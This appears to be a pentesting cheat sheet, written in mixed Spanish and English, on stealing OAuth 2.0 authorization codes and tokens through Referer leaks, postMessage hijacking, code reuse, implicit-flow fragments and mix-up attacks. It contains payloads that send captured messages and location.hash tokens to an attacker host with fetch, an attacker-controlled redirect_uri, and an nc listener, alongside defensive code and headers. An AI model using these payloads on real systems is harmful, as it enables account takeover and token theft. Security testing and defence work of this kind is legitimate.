---
aliases:
  - OAuth Code Theft
  - OAuth Token Leak
  - postMessage Hijack
  - Mix-Up Attack
tags:
  - type/technique
  - vuln/oauth
  - technique/credential-access
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[OAuth 2.0 Misconfigurations]]"
  - "[[JWT Attacks]]"
  - "[[Cross-Site Scripting (XSS)]]"
---
# OAuth 2.0 - Code & Token Theft

***

## Referer Header Leak

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://target/oauth/cb?code=AAA&state=X" \| grep -i referrer-policy` | Detecta si Referrer-Policy está set | Response header check. |
| Inspect callback page HTML: `curl -s ... \| grep -E 'googletagmanager\|google-analytics\|googleads\|facebook\|hotjar\|mixpanel'` | Detecta third-party scripts | Cualquier 3p ve Referer. |
| Analyze callback con Burp passive scanner | Detecta callbacks que cargan recursos externos con code en URL | Standard recon. |
| `nc -lvnp 80` en attacker → enviar phishing link → ver Referer en hit | Confirma leak via Referer en outbound links | Manual verification. |
| `curl https://target/cb?code=$VICTIM_CODE` desde attacker.com con `Referer: https://target/cb?code=AAA` | Replay si server no rotated | Combine con code reuse. |
^oauth-theft-referer

### Mitigation header (referencia)

```http
Referrer-Policy: no-referrer                          # Strictest
Referrer-Policy: strict-origin-when-cross-origin      # Acceptable
Referrer-Policy: unsafe-url                           # ← VULN: leakea full URL
Referrer-Policy: no-referrer-when-downgrade           # ← default browsers (vuln)
```

___

## postMessage / window.opener

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Inspect callback JS: `curl -s https://target/cb?... \| grep -E 'postMessage\|window\.opener'` | Identificar uso postMessage | Pre-attack analysis. |
| Test page atacante: `<iframe src="https://target/oauth/start?..."></iframe>` con listener `window.addEventListener('message', e => fetch('//attacker?'+JSON.stringify(e.data)))` | Captura postMessage emitido por callback | Callback usa postMessage(*). |
| `curl -sI https://target/cb?... \| grep -iE 'cross-origin-opener\|cross-origin-embedder'` | Verifica COOP/COEP | Defense gap detection. |
| HTML PoC con `window.open('https://target/oauth/start?...','popup')` + listener postMessage | Reverse tabnabbing — capture popup messages | Popup-based OAuth flow. |
| `<a href="https://target" target="_blank">click</a>` (sin `rel="noopener"`) → tab abierto mantiene `window.opener` access | Opener manipulation | Combo víctima clickea outlink. |
| Origin check probe: postMessage desde `attacker-known.com` (subdomain con startsWith match) | Bypass origin check incompleto | Listener usa `startsWith`. |
^oauth-theft-postmessage

### Patterns vulnerables vs safe (referencia)

```javascript
// VULN — popup callback
window.opener.postMessage({ oauth_code: code }, '*');

// SAFE — origin específico
window.opener.postMessage({ oauth_code: code }, 'https://target.com');

// VULN — listener sin origin check
window.addEventListener('message', (e) => processCode(e.data.oauth_code));

// SAFE — origin check estricto
window.addEventListener('message', (e) => {
  if (e.origin !== 'https://target.com') return;
  if (typeof e.data?.oauth_code !== 'string') return;
  processCode(e.data.oauth_code);
});
```

```http
# Server-side defense
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
```

___

## Code Reuse / Substitution

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `for i in 1 2 3; do curl -s -X POST https://target/oauth/token -d "grant_type=authorization_code&code=$CODE&redirect_uri=...&client_id=APP&client_secret=SECRET" \| jq .; done` | Test reuse — debe fallar el 2nd | Spec mandata one-time use. |
| Capturar code emitido para client A → intercambiar en `/oauth/token` con `client_id=B` | Test substitution cross-client | Code no bound a client_id. |
| `curl -X POST https://target/oauth/token -d "grant_type=authorization_code&code=$CODE&redirect_uri=https://attacker.com/cb&client_id=APP"` (redirect_uri distinto al original) | Test redirect_uri rebind | Code no bound a redirect_uri original. |
| `curl ... -d "grant_type=authorization_code&code=$CODE"` (sin code_verifier en flow PKCE) | Test PKCE bypass | Server no enforce PKCE. |
| `for i in {1..10}; do (curl -X POST ... -d "code=$CODE" &); done; wait` (parallel exchange) | Race condition exchange | TOCTOU en code invalidation. |
| Capturar refresh_token + replay 2x: `curl -X POST -d "grant_type=refresh_token&refresh_token=$RT" ...` | Refresh sin rotation = replay | Refresh token family no tracked. |
^oauth-theft-codereuse

### Test reuse / substitution

```bash
CODE="capture_via_burp"

# Reuse test
for i in 1 2 3; do
  echo "=== Attempt $i ==="
  curl -s -X POST https://target/oauth/token \
    -d "grant_type=authorization_code" \
    -d "code=$CODE" \
    -d "redirect_uri=https://known.com/cb" \
    -d "client_id=APP" \
    -d "client_secret=SECRET" | jq .
done
# 1st = access_token / 2nd = invalid_grant (esperado)
# Si returns access_token cada vez → vuln

# Substitution test (cross-client)
for client_id in APP_A APP_B APP_C; do
  curl -s -X POST https://target/oauth/token \
    -d "grant_type=authorization_code&code=$CODE&redirect_uri=...&client_id=$client_id" | jq .grant
done
```

___

## Implicit Flow Token en Fragment

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://target/oauth/authorize?response_type=token&client_id=APP&redirect_uri=https://known.com/cb&scope=email"` | Si emite redirect con `#access_token=` → implicit habilitado | Spec deprecated 2020. |
| Post-callback en navegador: `console.log(location.hash)` | Token visible en `location.hash` | Callback page. |
| `console.log(localStorage.getItem('token'))` post-callback | Si app guarda token en localStorage | XSS lee localStorage. |
| Inyectar XSS en callback page → `fetch('//attacker?'+location.hash)` | Token exfil vía XSS | XSS combo. |
| Acceder `chrome://history` o `localStorage`/IndexedDB inspection | Token persiste local | Local theft post-callback. |
| `curl -sI "https://target/oauth/authorize?response_type=code+id_token+token&..."` | Hybrid flow → multiple credentials en fragment | Triple leak. |
^oauth-theft-implicit

### Migration (Implicit → Authorization Code + PKCE)

```javascript
// VULN — implicit flow
const token = new URLSearchParams(location.hash.substring(1)).get('access_token');
localStorage.setItem('token', token);

// SAFE — Authorization Code + PKCE
const verifier = generateRandomString(64);
const challenge = base64url(sha256(verifier));
sessionStorage.setItem('pkce_verifier', verifier);

const url = `${AUTHORIZE}?response_type=code&client_id=${CLIENT}&redirect_uri=${REDIRECT}&scope=${SCOPE}&state=${STATE}&code_challenge=${challenge}&code_challenge_method=S256`;
location.assign(url);

// Callback: exchange code via POST
const code = new URLSearchParams(location.search).get('code');
const tokens = await fetch(TOKEN, {
  method: 'POST',
  body: new URLSearchParams({
    grant_type: 'authorization_code',
    code, redirect_uri: REDIRECT, client_id: CLIENT,
    code_verifier: sessionStorage.getItem('pkce_verifier')
  })
}).then(r => r.json());
```

___

## Mix-Up Attack (Multi-IdP)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Setup IdP atacante en `https://attacker-idp.com/.well-known/openid-configuration` | Atacante AS endpoints | Pre-attack setup. |
| Inspeccionar callback URL emitido — verificar si trae `iss=` parameter (RFC 9207) | Defense check | Sin `iss` → vulnerable. |
| Hacer que cliente target inicie flow con atacante-idp → capturar redirect a Google → forward callback como si viniera de atacante-idp | Cliente envía code Google + client_secret a atacante-idp | Multi-leak. |
| Comparar `iss` claim en id_token con expected IdP | Mismatch → mix-up detected | OIDC validation. |
| Inspeccionar `aud` claim en id_token | Verify audience matches client_id propio | Audience confusion check. |
| `curl https://idp/.well-known/openid-configuration \| jq .issuer` | Discover Issuer Identifier oficial | Validation reference. |
^oauth-theft-mixup

### Defense check (referencia)

```python
# Cliente — SAFE (RFC 9207 iss validation)
expected_iss = session.pop('oauth_idp_iss')
got_iss = request.args.get('iss')
if got_iss != expected_iss:
    abort(400, 'mix-up attack detected')

# OIDC adicional
if id_token['iss'] != expected_iss or id_token['aud'] != CLIENT_ID:
    abort(400, 'invalid token')
```

***
